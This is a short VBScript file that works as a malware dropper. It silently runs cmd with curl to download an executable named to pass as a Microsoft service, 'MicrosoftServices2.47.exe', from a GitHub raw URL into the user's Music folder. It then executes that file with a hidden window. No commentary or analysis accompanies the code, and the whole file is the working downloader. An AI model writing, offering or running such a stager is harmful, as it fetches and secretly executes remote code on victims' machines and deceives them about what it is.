Set shell = CreateObject("WScript.Shell")

Dim dir, pay, payName, fullPath

payName = "MicrosoftServices2.47.exe"
dir = "Music"
pay = "https://github.com/user8-alt0/hubs-n-mor/raw/refs/heads/main/win/MicrosoftServices2.47.exe"

fullPath = "%USERPROFILE%\" & dir & "\" & payName
shell.Run "cmd /c cd %USERPROFILE%\" & dir & " && curl -O " & pay, 0, True
shell.Run fullPath, 0, False



